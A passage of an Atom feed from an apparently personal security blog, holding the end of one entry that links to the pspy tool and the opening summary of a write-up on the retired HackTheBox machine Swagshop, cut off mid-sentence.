+&lt;a href="https://github.com/DominicBreuker/pspy"&gt;pspy&lt;/a&gt; before.&lt;/p&gt;</content><category term="security"></category><category term="boot2root"></category><category term="HTB"></category></entry><entry><title>HTB: Swagshop</title><link href="https://maggick.fr/2019/09/htb-swagshop.html" rel="alternate"></link><published>2019-09-29T09:00:00+02:00</published><updated>2019-09-29T09:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-09-29:/2019/09/htb-swagshop.html</id><summary type="html">&lt;p&gt;&lt;img alt="Swagshop Card" class="align-left" src="/media/2019.09/swagshop_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This article is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/188"&gt;Swagshop&lt;/a&gt;
 This box was suppose to be an easy one. Turns out it wasn't. I struggle a lot in
